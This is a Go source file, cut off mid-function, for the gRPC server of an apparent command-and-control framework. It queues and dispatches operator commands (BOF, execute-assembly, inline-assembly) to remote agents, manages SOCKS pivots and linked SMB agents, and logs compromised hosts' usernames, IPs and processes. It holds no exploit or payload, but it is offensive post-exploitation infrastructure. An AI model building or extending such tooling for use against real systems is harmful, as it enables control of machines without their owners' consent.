// internal/agent/server/grpc.go
package server

import (
	"c2/internal/agent/listeners"
	"c2/internal/agent/socks"
	"c2/internal/common/commands"
	"c2/internal/common/config"
	"c2/internal/common/interfaces"
	"c2/internal/common/logging" // ADD THIS IMPORT
	pb "c2/proto"
	"context"
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os" // ADD THIS IMPORT
	"strconv"
	"strings"
	"sync"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/health"
	"google.golang.org/grpc/health/grpc_health_v1"
	"google.golang.org/grpc/keepalive"
)

var _ interfaces.CommandBuffer = (*GRPCServer)(nil)

func (s *GRPCServer) QueueUploadNextChunk(agentID string, chunkDir string) error {
	return s.queueNextChunk(agentID, chunkDir)
}

type FileTransferJob struct {
	JobID       int    `json:"job_id"`
	Type        string `json:"type"` // "upload" or "download"
	Filename    string `json:"filename"`
	Progress    int    `json:"progress"` // percentage
	CurrentSize int64  `json:"current_size"`
	TotalSize   int64  `json:"total_size"`
}

// ADD: StreamConnection struct for tracking connections
type StreamConnection struct {
	ClientID     string
	Stream       pb.AgentControl_BiDiStreamServer
	Connected    time.Time
	LastActivity time.Time
	LastPing     time.Time
	FailedPings  int
	IsActive     bool
	mu           sync.RWMutex
}

type GRPCServer struct {
	pb.UnimplementedAgentControlServer
	manager       *listeners.Manager
	server        *grpc.Server
	Mutex         sync.Mutex
	subscribers   map[string]chan *pb.StreamMessage
	CommandBuffer map[string][]Command
	db            *sql.DB
	socksServers  map[string]*struct {
		server *socks.Server
		bridge *socks.Bridge
	}
	socksMutex sync.RWMutex
	httpMux    *http.ServeMux
	// ADD: New fields for stream monitoring
	streamConnections map[string]*StreamConnection
	streamMutex       sync.RWMutex
	pingTicker        *time.Ticker
	commandLogger     *logging.SimpleLogger // ADD THIS FIELD
}

func NewGRPCServer(manager *listeners.Manager, cmdBuffer map[string][]Command, db *sql.DB, mux *http.ServeMux) *GRPCServer {
	s := &GRPCServer{
		manager:       manager,
		server:        grpc.NewServer(),
		subscribers:   make(map[string]chan *pb.StreamMessage),
		CommandBuffer: cmdBuffer,
		Mutex:         sync.Mutex{},
		db:            db,
		socksServers: make(map[string]*struct {
			server *socks.Server
			bridge *socks.Bridge
		}),
		socksMutex:        sync.RWMutex{},
		httpMux:           mux,
		streamConnections: make(map[string]*StreamConnection), // ADD: Initialize stream connections
	}

	// ADD: Initialize simple command logger
	if logger, err := logging.NewSimpleLogger("/app/logs/commands"); err != nil {
		log.Printf("Failed to initialize command logger: %v", err)
	} else {
		s.commandLogger = logger
		log.Printf("Command logger initialized at /app/logs/commands")
	}

	// ADD: Register log endpoint
	s.RegisterLogEndpoint(mux)

	return s
}

// ADD: Simple HTTP endpoint to view logs
func (s *GRPCServer) RegisterLogEndpoint(mux *http.ServeMux) {
	mux.HandleFunc("/logs/recent", func(w http.ResponseWriter, r *http.Request) {
		// Read today's log file
		logFile := fmt.Sprintf("/app/logs/commands/commands_%s.log", time.Now().Format("2006-01-02"))
		data, err := os.ReadFile(logFile)
		if err != nil {
			http.Error(w, "Failed to read log file", http.StatusInternalServerError)
			return
		}

		w.Header().Set("Content-Type", "text/plain")
		w.Write(data)
	})
}

func (s *GRPCServer) SetManager(m *listeners.Manager) {
	s.manager = m
}

type Command struct {
	CommandType  int    `json:"command_type"`  // Numeric command ID (see commands.registry)
	Command      string `json:"command"`       // Full command string with args (for parsing)
	CommandID    string `json:"command_id"`
	CommandDBID  int    `json:"command_db_id"`
	AgentID      string `json:"agent_id"`
	Filename     string `json:"filename"`
	RemotePath   string `json:"remote_path"`
	CurrentChunk int    `json:"currentChunk"`
	TotalChunks  int    `json:"totalChunks"`
	Data         string `json:"data"`
	Timestamp    string `json:"timestamp"`
}

// CommandBuffer now stores Command objects instead of strings
type CommandBuffer struct {
	Mutex         sync.Mutex
	CommandBuffer map[string][]Command
}

type SocksCommandData struct {
	Action      string             `json:"action"`
	SocksPort   int                `json:"socks_port"`
	WSSPort     int                `json:"wss_port"`
	WSSHost     string             `json:"wss_host"`
	Path        string             `json:"path"`
	Credentials *socks.Credentials `json:"credentials"`
}

func NewCommandBuffer() *CommandBuffer {
	return &CommandBuffer{
		CommandBuffer: make(map[string][]Command),
	}
}

func (c *GRPCServer) StoreCommand(clientID string, command string, username string) {
	// Parameter validation
	if clientID == "" || command == "" || username == "" {
		log.Printf("[StoreCommand] Invalid parameters: clientID, command, and username cannot be empty")
		return
	}

	c.Mutex.Lock()
	defer c.Mutex.Unlock()

	// Start transaction...
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	tx, err := c.db.BeginTx(ctx, &sql.TxOptions{
		Isolation: sql.LevelReadCommitted,
	})
	if err != nil {
		log.Printf("[StoreCommand] Failed to begin transaction: %v", err)
		return
	}
	defer tx.Rollback()

	var commandDBID int
	err = tx.QueryRowContext(ctx, `
        INSERT INTO commands (username, guid, command, timestamp)
        VALUES ($1, $2, $3, $4)
        RETURNING id`,
		username,
		clientID,
		command,
		time.Now().Format("2006-01-02T15:04:05.000000"),
	).Scan(&commandDBID)

	if err != nil {
		log.Printf("[StoreCommand] Failed to store command in DB: %v", err)
		return
	}

	// Create command object without trying to parse the command as JSON
	// Translate command name to numeric ID for payload dispatch
	cmdType := commands.GetCommandID(command)
	cmd := Command{
		CommandType: cmdType,
		Command:     command,
		AgentID:     clientID,
		CommandDBID: commandDBID,
		// We're receiving command_id via the websocket so we should pass it in as a parameter
		CommandID: "", // We'll add this as a new parameter to StoreCommand
		Timestamp: time.Now().Format("2006-01-02T15:04:05.000000"),
	}

	// Initialize the slice if it doesn't exist
	if c.CommandBuffer[clientID] == nil {
		c.CommandBuffer[clientID] = make([]Command, 0)
	}

	c.CommandBuffer[clientID] = append(c.CommandBuffer[clientID], cmd)

	log.Printf("[StoreCommand] Successfully stored command for client %s with ID %d",
		clientID, commandDBID)

	if err := tx.Commit(); err != nil {
		log.Printf("[StoreCommand] Failed to commit transaction: %v", err)
		return
	}
}

// stripFilePathFromCommand removes the file path from commands that include files
func stripFilePathFromCommand(command string) string {
	// Check if this is a command that needs file path stripping
	needsStripping := false
	for _, prefix := range []string{
		"bof ", "bof-async ",
		"inline-assembly ", "inline-assembly-async ",
		"execute-assembly ",
	} {
		if strings.HasPrefix(command, prefix) {
			needsStripping = true
			break
		}
	}

	if !needsStripping {
		return command
	}

	// Split into at most 3 parts: [command, filepath, rest_of_args]
	parts := strings.SplitN(command, " ", 3)

	if len(parts) <= 1 {
		// Just the command, no arguments
		return command
	}

	if len(parts) == 2 {
		// Command + filepath, no additional arguments
		return parts[0] // Return just the command
	}

	// Command + filepath + arguments
	// parts[0] = command name
	// parts[1] = the file path (to be removed)
	// parts[2] = remaining arguments
	return parts[0] + " " + parts[2]
}

// truncateData truncates the data field for logging purposes
func truncateData(data string, maxLen int) string {
	if len(data) <= maxLen {
		return data
	}
	return fmt.Sprintf("%s... [%d bytes total]", data[:maxLen], len(data))
}

// formatCommandForLog creates a log-friendly version of a command
func formatCommandForLog(cmd Command) string {
	// Create a copy with truncated data
	logCmd := cmd
	if len(cmd.Data) > 100 {
		logCmd.Data = truncateData(cmd.Data, 100)
	}

	// Marshal the modified command
	jsonBytes, err := json.Marshal(logCmd)
	if err != nil {
		return fmt.Sprintf("Command{ID: %s, Type: %s, DataLen: %d}",
			cmd.CommandID, cmd.Command, len(cmd.Data))
	}
	return string(jsonBytes)
}

// formatCommandsForLog formats multiple commands for logging
func formatCommandsForLog(cmds []Command) string {
	logCmds := make([]Command, len(cmds))
	for i, cmd := range cmds {
		logCmds[i] = cmd
		if len(cmd.Data) > 100 {
			logCmds[i].Data = truncateData(cmd.Data, 100)
		}
	}

	jsonBytes, err := json.Marshal(logCmds)
	if err != nil {
		return fmt.Sprintf("[%d commands]", len(cmds))
	}
	return string(jsonBytes)
}

// Update the GetCommand function in server/internal/agent/server/grpc.go
// OPTIMIZED: Narrow critical section to minimize lock hold time
func (s *GRPCServer) GetCommand(clientID string) ([]string, bool) {
	// ========== CRITICAL SECTION START ==========
	s.Mutex.Lock()

	cmds, exists := s.CommandBuffer[clientID]
	if !exists || len(cmds) == 0 {
		s.Mutex.Unlock()
		return nil, false
	}

	// Copy commands to local variable (deep copy to avoid race conditions)
	cmdsCopy := make([]Command, len(cmds))
	copy(cmdsCopy, cmds)

	// Clear the buffer immediately while we still have the lock
	s.CommandBuffer[clientID] = []Command{}

	s.Mutex.Unlock()
	// ========== CRITICAL SECTION END (lock held for ~5 lines instead of 50+) ==========

	// Log command dispatch concisely
	for _, cmd := range cmdsCopy {
		log.Printf("[CMD] agent=%s cmd_id=%s type=%d (dispatched)", clientID, cmd.CommandID, cmd.CommandType)
	}

	// Strip file paths from commands before sending to agent
	for i := range cmdsCopy {
		cmdsCopy[i].Command = stripFilePathFromCommand(cmdsCopy[i].Command)
	}

	cmdJSON, err := json.Marshal(cmdsCopy)
	if err != nil {
		log.Printf("[CMD] Failed to marshal commands for agent=%s: %v", clientID, err)
		return nil, false
	}

	return []string{string(cmdJSON)}, true
}

func (s *GRPCServer) DeleteCommand(clientID string) {
	s.Mutex.Lock()
	defer s.Mutex.Unlock()
	delete(s.CommandBuffer, clientID)
}

func (s *GRPCServer) Start(port string) error {
	creds, err := credentials.NewServerTLSFromFile(
		"/app/certs/rpc_server.crt",
		"/app/certs/rpc_server.key",
	)
	if err != nil {
		return fmt.Errorf("[gRPC Start] failed to load TLS certs: %v", err)
	}

	// MODIFY: Add keepalive parameters for better connection management
	s.server = grpc.NewServer(
		grpc.Creds(creds),
		grpc.KeepaliveParams(keepalive.ServerParameters{
			Time:    10 * time.Second,
			Timeout: 5 * time.Second,
		}),
		grpc.KeepaliveEnforcementPolicy(keepalive.EnforcementPolicy{
			MinTime:             5 * time.Second,
			PermitWithoutStream: true,
		}),
	)
	pb.RegisterAgentControlServer(s.server, s)

	// Add health service
	healthServer := health.NewServer()
	grpc_health_v1.RegisterHealthServer(s.server, healthServer)

	// Support both "port" and "address:port" formats
	address := port
	if !strings.Contains(port, ":") {
		address = ":" + port
	}
	lis, err := net.Listen("tcp", address)
	if err != nil {
		return fmt.Errorf("[gRPC Start] failed to listen on %s: %v", address, err)
	}

	// Signal that we're ready to accept connections
	log.Printf("[gRPC Start] gRPC server ready at %s", address)

	// Create a channel to signal startup completion
	ready := make(chan struct{})
	go func() {
		// Wait a short time for server to be ready
		time.Sleep(2 * time.Second)
		// Set health check status to serving
		healthServer.SetServingStatus("", grpc_health_v1.HealthCheckResponse_SERVING)
		close(ready)
	}()

	// Start server in goroutine
	go func() {
		if err := s.server.Serve(lis); err != nil && err != grpc.ErrServerStopped {
			log.Printf("[gRPC Start] failed to serve: %v", err)
		}
	}()

	// Wait for server to be ready
	<-ready

	// ADD: Start stream monitoring
	s.StartStreamMonitoring()

	return nil
}

func (s *GRPCServer) Stop() {
	log.Println("[gRPC Stop] Stopping gRPC server...")
	// ADD: Stop stream monitoring
	s.StopStreamMonitoring()
	s.server.GracefulStop()
	log.Println("[gRPC Stop] gRPC server stopped successfully")
}

// ADD: Stream monitoring methods
func (s *GRPCServer) StartStreamMonitoring() {
	s.pingTicker = time.NewTicker(10 * time.Second)
	go s.monitorStreams()
	log.Println("[StreamMonitor] Started stream monitoring")
}

func (s *GRPCServer) StopStreamMonitoring() {
	if s.pingTicker != nil {
		s.pingTicker.Stop()
		log.Println("[StreamMonitor] Stopped stream monitoring")
	}
}

func (s *GRPCServer) monitorStreams() {
	for range s.pingTicker.C {
		s.streamMutex.RLock()
		connections := make([]*StreamConnection, 0, len(s.streamConnections))
		for _, conn := range s.streamConnections {
			connections = append(connections, conn)
		}
		s.streamMutex.RUnlock()

		now := time.Now()
		for _, conn := range connections {
			conn.mu.RLock()
			lastActivity := conn.LastActivity
			isActive := conn.IsActive
			failedPings := conn.FailedPings
			conn.mu.RUnlock()

			if !isActive {
				continue
			}

			// Check if connection is stale (no activity for 2 minutes)
			if now.Sub(lastActivity) > 2*time.Minute {
				s.sendPing(conn)
			}

			// Remove connections with too many failed pings
			if failedPings >= 3 {
				log.Printf("[STREAM] Removing inactive connection: %s (3 failed pings)", conn.ClientID)
				s.removeStreamConnection(conn.ClientID)
			}
		}
	}
}

func (s *GRPCServer) sendPing(conn *StreamConnection) {
	pingMsg := &pb.StreamMessage{
		Type:      "ping",
		Content:   fmt.Sprintf(`{"timestamp":%d}`, time.Now().Unix()),
		Sender:    "agent_service",
		Timestamp: time.Now().Unix(),
	}

	s.Mutex.Lock()
	ch, exists := s.subscribers[conn.ClientID]
	s.Mutex.Unlock()

	if exists {
		select {
		case ch <- pingMsg:
			conn.mu.Lock()
			conn.LastPing = time.Now()
			conn.mu.Unlock()
			// Successful ping - no logging needed
		case <-time.After(5 * time.Second):
			conn.mu.Lock()
			conn.FailedPings++
			failures := conn.FailedPings
			conn.mu.Unlock()
			log.Printf("[STREAM] Ping timeout for %s (failures: %d/3)", conn.ClientID, failures)
		}
	}
}

func (s *GRPCServer) removeStreamConnection(clientID string) {
	s.streamMutex.Lock()
	if conn, exists := s.streamConnections[clientID]; exists {
		conn.mu.Lock()
		conn.IsActive = false
		conn.mu.Unlock()
		delete(s.streamConnections, clientID)
	}
	s.streamMutex.Unlock()

	s.Mutex.Lock()
	delete(s.subscribers, clientID)
	s.Mutex.Unlock()

	log.Printf("[StreamMonitor] Removed connection: %s", clientID)
}

// ADD: GetStreamStatus for health checks
func (s *GRPCServer) GetStreamStatus() map[string]interface{} {
	s.streamMutex.RLock()
	defer s.streamMutex.RUnlock()

	activeCount := 0
	connections := make([]map[string]interface{}, 0)

	for clientID, conn := range s.streamConnections {
		conn.mu.RLock()
		if conn.IsActive {
			activeCount++
			connections = append(connections, map[string]interface{}{
				"client_id":     clientID,
				"connected":     conn.Connected.Format(time.RFC3339),
				"last_activity": conn.LastActivity.Format(time.RFC3339),
				"failed_pings":  conn.FailedPings,
			})
		}
		conn.mu.RUnlock()
	}

	return map[string]interface{}{
		"total_connections": len(s.streamConnections),
		"active_streams":    activeCount,
		"connections":       connections,
	}
}

func (s *GRPCServer) StartListener(ctx context.Context, req *pb.ListenerRequest) (*pb.ListenerResponse, error) {
	listenerCfg := config.ListenerConfig{
		Name:                  req.Name,
		Protocol:              req.Type.String(),
		Port:                  int(req.Port),
		Secure:                req.Secure,
		BindIP:                req.BindIp,
		GetProfile:            req.GetGetProfile(),
		PostProfile:           req.GetPostProfile(),
		ServerResponseProfile: req.GetServerResponseProfile(),
	}

	err := s.manager.StartListener(listenerCfg)
	if err != nil {
		return &pb.ListenerResponse{
			Success:   false,
			Message:   err.Error(),
			ErrorCode: 2,
		}, nil
	}

	return &pb.ListenerResponse{
		Success: true,
		Message: fmt.Sprintf("Listener %s started successfully on port %d", req.Name, req.Port),
	}, nil
}

func (s *GRPCServer) StopListener(ctx context.Context, req *pb.ListenerRequest) (*pb.ListenerResponse, error) {
	if req.Name == "" {
		return &pb.ListenerResponse{
			Success:   false,
			Message:   "Listener name is required",
			ErrorCode: 3,
		}, nil
	}

	err := s.manager.StopListener(req.Name)
	if err != nil {
		return &pb.ListenerResponse{
			Success:   false,
			Message:   err.Error(),
			ErrorCode: 4,
		}, nil
	}

	return &pb.ListenerResponse{
		Success: true,
		Message: fmt.Sprintf("Listener %s stopped successfully", req.Name),
	}, nil
}

func (s *GRPCServer) GetStatus(req *pb.StatusRequest, stream pb.AgentControl_GetStatusServer) error {
	status := &pb.StatusResponse{
		Status: "Running",
		Listeners: []*pb.ActiveListener{
			{
				Name:        "example",
				Port:        8080,
				Active:      true,
				StartTime:   time.Now().Format(time.RFC3339),
				Connections: 0,
			},
		},
	}
	log.Printf("[GetStatus] Streaming status: %+v", status)
	return stream.Send(status)
}

func (s *GRPCServer) RegisterInit(ctx context.Context, req *pb.InitRequest) (*pb.InitResponse, error) {
	log.Printf("[RegisterInit] Received init registration request for client: %s", req.ClientId)

	// Store the init data in memory
	initData := &listeners.InitData{
		ID:         req.Id,
		ClientID:   req.ClientId,
		Type:       req.Type,
		Secret:     req.Secret,
		OS:         req.Os,
		Arch:       req.Arch,
		RSAKey:     req.RsaKey,
		Protocol:   req.Protocol,
		SMBProfile: req.SmbProfile,
		SMBXorKey:  req.SmbXorKey,
		HTTPXorKey: req.HttpXorKey,
		TCPProfile: req.TcpProfile,
		TCPXorKey:  req.TcpXorKey,
		TCPPort:    req.TcpPort,
	}

	// Add to the manager's in-memory storage
	err := s.manager.StoreInitData(initData)
	if err != nil {
		log.Printf("[RegisterInit] Failed to store init data: %v", err)
		return &pb.InitResponse{
			Success:   false,
			Message:   err.Error(),
			ErrorCode: 1,
		}, nil
	}

	log.Printf("[RegisterInit] Successfully registered init data for client: %s", req.ClientId)
	return &pb.InitResponse{
		Success: true,
		Message: fmt.Sprintf("Init data registered successfully for client %s", req.ClientId),
	}, nil
}

func (s *GRPCServer) NotifyNewConnection(ctx context.Context, notification *pb.ConnectionNotification) (*pb.ConnectionResponse, error) {
	log.Printf("[NotifyNewConnection] Received notification for new connection with clientID: %s", notification.ClientId)
	log.Printf("[NotifyNewConnection] Details: newClientID=%s, hostname=%s, os=%s/%s",
		notification.NewClientId, notification.Hostname, notification.Os, notification.Arch)

	if s.commandLogger != nil {
		// Log the full agent information
		agentInfo := &logging.AgentInfo{
			AgentID:    notification.NewClientId,
			Hostname:   notification.Hostname,
			ExternalIP: notification.ExtIp,
			InternalIP: notification.IntIp,
			Username:   notification.Username,
			OS:         notification.Os,
			Arch:       notification.Arch,
			Process:    notification.Process,
			PID:        notification.Pid,
			Integrity:  "medium", // You could determine this from the agent
		}

		// Update the cached agent info
		s.commandLogger.UpdateAgentInfo(agentInfo)

		// Also log the connection event itself
		s.commandLogger.Log(logging.LogEntry{
			Type:       "connection",
			AgentID:    notification.NewClientId,
			Hostname:   notification.Hostname,
			ExternalIP: notification.ExtIp,
			InternalIP: notification.IntIp,
			Username:   notification.Username,
			OS:         notification.Os,
			Arch:       notification.Arch,
			Process:    notification.Process,
			PID:        notification.Pid,
			Integrity:  "medium",
			Timestamp:  time.Now(),
			Details: map[string]interface{}{
				"client_id":     notification.ClientId,
				"new_client_id": notification.NewClientId,
				"protocol":      notification.Protocol,
				"last_seen":     notification.LastSeen,
			},
		})

		log.Printf("[NotifyNewConnection] Logged connection and cached agent info for %s", notification.NewClientId)
	}

	// Create a sanitized message for broadcast that excludes secrets
	connectionData := struct {
		NewClientID    string `json:"new_client_id"`
		ClientID       string `json:"client_id"`
		Protocol       string `json:"protocol"`
		ExtIP          string `json:"ext_ip"`
		IntIP          string `json:"int_ip"`
		Username       string `json:"username"`
		Hostname       string `json:"hostname"`
		Process        string `json:"process"`
		PID            string `json:"pid"`
		Arch           string `json:"arch"`
		OS             string `json:"os"`
		LastSeen       int64  `json:"last_seen"`
		ParentClientID string `json:"parent_client_id,omitempty"` // For linked agents
		LinkType       string `json:"link_type,omitempty"`        // Link type (e.g., "smb")
	}{
		NewClientID:    notification.NewClientId,
		ClientID:       notification.ClientId,
		Protocol:       notification.Protocol,
		ExtIP:          notification.ExtIp,
		IntIP:          notification.IntIp,
		Username:       notification.Username,
		Hostname:       notification.Hostname,
		Process:        notification.Process,
		PID:            notification.Pid,
		Arch:           notification.Arch,
		OS:             notification.Os,
		LastSeen:       notification.LastSeen,
		ParentClientID: notification.ParentClientId,
		LinkType:       notification.LinkType,
	}

	// Convert to JSON
	jsonData, err := json.Marshal(connectionData)
	if err != nil {
		log.Printf("[NotifyNewConnection] Failed to marshal connection data: %v", err)
		return &pb.ConnectionResponse{
			Success: false,
			Message: fmt.Sprintf("Failed to process connection notification: %v", err),
		}, nil
	}

	// Create stream message
	streamMsg := &pb.StreamMessage{
		Type:      "new_connection",
		Content:   string(jsonData),
		Sender:    "agent_handler",
		Timestamp: time.Now().Unix(),
	}

	// Broadcast to all subscribers
	s.Mutex.Lock()
	subscriberCount := len(s.subscribers)
	successCount := 0
	for clientID, ch := range s.subscribers {
		select {
		case ch <- streamMsg:
			successCount++
			log.Printf("[NotifyNewConnection] Successfully sent notification to subscriber: %s", clientID)
		default:
			log.Printf("[NotifyNewConnection] Warning: Subscriber channel full, skipping notification to: %s", clientID)
		}
	}
	s.Mutex.Unlock()

	log.Printf("[NotifyNewConnection] Broadcast complete: %d/%d subscribers notified", successCount, subscriberCount)

	return &pb.ConnectionResponse{
		Success: true,
		Message: fmt.Sprintf("Successfully notified of new connection for client %s", notification.ClientId),
	}, nil
}

func (s *GRPCServer) BiDiStream(stream pb.AgentControl_BiDiStreamServer) error {
	// Wait for the first message to identify the client
	initialMsg, err := stream.Recv()
	if err != nil {
		log.Printf("[BiDiStream] Failed to receive initial message: %v", err)
		return err
	}

	clientID := initialMsg.Sender
	if clientID == "" {
		return fmt.Errorf("[BiDiStream] clientID is required in the initial message")
	}

	log.Printf("[BiDiStream] New client connected: %s", clientID)

	// ADD: Register stream connection for monitoring
	conn := &StreamConnection{
		ClientID:     clientID,
		Stream:       stream,
		Connected:    time.Now(),
		LastActivity: time.Now(),
		LastPing:     time.Now(),
		FailedPings:  0,
		IsActive:     true,
	}
	s.streamMutex.Lock()
	s.streamConnections[clientID] = conn
	s.streamMutex.Unlock()

	// Create a buffered channel for this client
	sendChannel := make(chan *pb.StreamMessage, 100) // Increased buffer size
	s.Mutex.Lock()
	s.subscribers[clientID] = sendChannel
	s.Mutex.Unlock()

	defer func() {
		// ADD: Clean up stream connection
		s.streamMutex.Lock()
		if sc, exists := s.streamConnections[clientID]; exists {
			sc.mu.Lock()
			sc.IsActive = false
			sc.mu.Unlock()
			delete(s.streamConnections, clientID)
		}
		s.streamMutex.Unlock()

		s.Mutex.Lock()
		delete(s.subscribers, clientID)
		s.Mutex.Unlock()
		close(sendChannel)
		log.Printf("[BiDiStream] Client disconnected: %s", clientID)
	}()

	// Send confirmation of successful connection
	confirmationMsg := &pb.StreamMessage{
		Type:      "connection_confirmed",
		Content:   fmt.Sprintf("BiDi stream established for %s", clientID),
		Sender:    "server",
		Timestamp: time.Now().Unix(),
	}
	if err := stream.Send(confirmationMsg); err != nil {
		log.Printf("[BiDiStream] Failed to send confirmation message: %v", err)
		return err
	}

	// Create error channel for the send goroutine
	errChan := make(chan error, 1)

	// Start goroutine to send messages to the client
	go func() {
		for msg := range sendChannel {
			if err := stream.Send(msg); err != nil {
				log.Printf("[BiDiStream] Error sending message to client %s: %v", clientID, err)
				errChan <- err
				return
			}
			// Update activity on successful send
			conn.mu.Lock()
			conn.LastActivity = time.Now()
			conn.mu.Unlock()
		}
	}()

	// Handle incoming messages
	for {
		select {
		case err := <-errChan:
			return err
		default:
			msg, err := stream.Recv()
			if err == io.EOF {
				log.Printf("[BiDiStream] Client %s disconnected", clientID)
				return nil
			}
			if err != nil {
				log.Printf("[BiDiStream] Error receiving message from client %s: %v", clientID, err)
				return err
			}

			// ADD: Update activity and handle pings
			conn.mu.Lock()
			conn.LastActivity = time.Now()
			conn.mu.Unlock()

			// ADD: Handle ping/pong
			if msg.Type == "ping" {
				pongMsg := &pb.StreamMessage{
					Type:      "pong",
					Content:   msg.Content,
					Sender:    "server",
					Timestamp: time.Now().Unix(),
				}
				select {
				case sendChannel <- pongMsg:
					//log.Printf("[BiDiStream] Sent pong to %s", clientID)
				default:
					log.Printf("[BiDiStream] Failed to send pong to %s (channel full)", clientID)
				}
				continue
			} else if msg.Type == "pong" {
				conn.mu.Lock()
				conn.FailedPings = 0
				conn.mu.Unlock()
				log.Printf("[BiDiStream] Received pong from %s", clientID)
				continue
			}

			//log.Printf("[BiDiStream] Received message from client %s: Type=%s", clientID, msg.Type)

			// Handle received message (can be expanded based on message type)
			go s.processReceivedMessage(msg)
		}
	}
}

// OPTIMIZED: Snapshot subscribers before iteration to reduce lock hold time
func (s *GRPCServer) BroadcastResult(result map[string]interface{}) error {
	// ADD: Log command output if present
	if s.commandLogger != nil {
		if agentID, ok := result["agent_id"].(string); ok {
			if output, ok := result["output"].(string); ok {
				// Extract command ID (might be float64 or string)
				var cmdID interface{}
				if id, ok := result["command_id"].(float64); ok {
					cmdID = int(id)
				} else if id, ok := result["command_id"].(string); ok {
					cmdID = id
				}

				if cmdID != nil {
					s.commandLogger.LogOutput(agentID, cmdID, output)
				}
			}
		}
	}

	resultJSON, err := json.Marshal(result)
	if err != nil {
		return fmt.Errorf("failed to marshal command result: %v", err)
	}

	// Use the type from the result map if specified, otherwise default to command_result
	msgType := "command_result"
	if typeVal, ok := result["type"].(string); ok && typeVal != "" {
		msgType = typeVal
	}

	streamMsg := &pb.StreamMessage{
		Type:      msgType,
		Content:   string(resultJSON),
		Sender:    "agent_handler",
		Timestamp: time.Now().Unix(),
	}

	// ========== CRITICAL SECTION START ==========
	s.Mutex.Lock()
	// Snapshot subscribers (avoid holding lock during channel sends)
	subscriberSnapshot := make(map[string]chan *pb.StreamMessage, len(s.subscribers))
	for clientID, ch := range s.subscribers {
		subscriberSnapshot[clientID] = ch
	}
	s.Mutex.Unlock()
	// ========== CRITICAL SECTION END ==========

	// Broadcast to snapshot (no lock held)
	for clientID, ch := range subscriberSnapshot {
		select {
		case ch <- streamMsg:
		default:
			log.Printf("[BroadcastResult] Warning: Subscriber channel full, skipping: %s", clientID)
		}
	}

	return nil
}

// OPTIMIZED: Snapshot subscribers before iteration to reduce lock hold time
func (s *GRPCServer) BroadcastLastSeen(agentID string, timestamp int64) error {
	if s.commandLogger != nil {
		// If we have cached agent info, it will be included automatically
		s.commandLogger.Log(logging.LogEntry{
			Type:      "checkin",
			AgentID:   agentID,
			Timestamp: time.Unix(timestamp, 0),
			Details: map[string]interface{}{
				"last_seen": timestamp,
			},
		})
	}

	checkinData := struct {
		Type string `json:"type"`
		Data struct {
			AgentID  string `json:"agent_id"`
			LastSeen int64  `json:"last_seen"`
		} `json:"data"`
	}{
		Type: "agent_checkin",
		Data: struct {
			AgentID  string `json:"agent_id"`
			LastSeen int64  `json:"last_seen"`
		}{
			AgentID:  agentID,
			LastSeen: timestamp,
		},
	}

	jsonData, err := json.Marshal(checkinData)
	if err != nil {
		return fmt.Errorf("failed to marshal checkin data: %v", err)
	}

	// Create stream message
	streamMsg := &pb.StreamMessage{
		Type:      "agent_checkin", // This distinguishes it from command results
		Content:   string(jsonData),
		Sender:    "agent_handler",
		Timestamp: time.Now().Unix(),
	}

	// ========== CRITICAL SECTION START ==========
	s.Mutex.Lock()
	// Snapshot subscribers (avoid holding lock during channel sends)
	subscriberSnapshot := make(map[string]chan *pb.StreamMessage, len(s.subscribers))
	for clientID, ch := range s.subscribers {
		subscriberSnapshot[clientID] = ch
	}
	s.Mutex.Unlock()
	// ========== CRITICAL SECTION END ==========

	// Broadcast to snapshot (no lock held)
	for clientID, ch := range subscriberSnapshot {
		select {
		case ch <- streamMsg:
			log.Printf("[BroadcastLastSeen] Successfully sent to subscriber: %s", clientID)
		default:
			log.Printf("[BroadcastLastSeen] Warning: Subscriber channel full, skipping: %s", clientID)
		}
	}

	return nil
}

// BroadcastLinkUpdate broadcasts a link update to all websocket clients
// This is used when an agent is linked or unlinked from a parent
// parentClientID and linkType are empty strings for unlink events
func (s *GRPCServer) BroadcastLinkUpdate(agentID string, parentClientID string, linkType string) error {
	linkUpdateData := struct {
		Type string `json:"type"`
		Data struct {
			AgentID        string `json:"agent_id"`
			ParentClientID string `json:"parent_client_id"`
			LinkType       string `json:"link_type"`
		} `json:"data"`
	}{
		Type: "link_update",
		Data: struct {
			AgentID        string `json:"agent_id"`
			ParentClientID string `json:"parent_client_id"`
			LinkType       string `json:"link_type"`
		}{
			AgentID:        agentID,
			ParentClientID: parentClientID,
			LinkType:       linkType,
		},
	}

	jsonData, err := json.Marshal(linkUpdateData)
	if err != nil {
		return fmt.Errorf("failed to marshal link update data: %v", err)
	}

	// Create stream message
	streamMsg := &pb.StreamMessage{
		Type:      "link_update",
		Content:   string(jsonData),
		Sender:    "agent_handler",
		Timestamp: time.Now().Unix(),
	}

	// Snapshot subscribers to avoid holding lock during sends
	s.Mutex.Lock()
	subscriberSnapshot := make(map[string]chan *pb.StreamMessage, len(s.subscribers))
	for clientID, ch := range s.subscribers {
		subscriberSnapshot[clientID] = ch
	}
	s.Mutex.Unlock()

	// Broadcast to snapshot (no lock held)
	for clientID, ch := range subscriberSnapshot {
		select {
		case ch <- streamMsg:
			log.Printf("[BroadcastLinkUpdate] Successfully sent to subscriber: %s", clientID)
		default:
			log.Printf("[BroadcastLinkUpdate] Warning: Subscriber channel full, skipping: %s", clientID)
		}
	}

	log.Printf("[BroadcastLinkUpdate] Broadcast link update for agent %s (parent=%s, type=%s)",
		agentID, parentClientID, linkType)
	return nil
}

func (s *GRPCServer) QueueDownloadCommand(clientID string, downloadCmd map[string]interface{}) error {
	s.Mutex.Lock()
	defer s.Mutex.Unlock()

	log.Printf("[QueueDownloadCommand] Starting to queue command for client %s", clientID)
	log.Printf("[QueueDownloadCommand] Current command buffer state: %+v", s.CommandBuffer)

	// Initialize the slice if it doesn't exist
	if s.CommandBuffer[clientID] == nil {
		s.CommandBuffer[clientID] = make([]Command, 0)
		log.Printf("[QueueDownloadCommand] Initialized new command buffer for client %s", clientID)
	}

	cmdStr := downloadCmd["command"].(string)
	cmdType := commands.GetCommandID(cmdStr)
	cmd := Command{
		CommandType:  cmdType,
		Command:      cmdStr,
		CommandID:    "", // No command_id needed for chunks
		CommandDBID:  downloadCmd["command_db_id"].(int),
		AgentID:      clientID,
		Filename:     downloadCmd["filename"].(string),
		RemotePath:   "",
		CurrentChunk: downloadCmd["currentChunk"].(int),
		TotalChunks:  downloadCmd["totalChunks"].(int),
		Timestamp:    time.Now().Format("2006-01-02T15:04:05.000000"),
	}
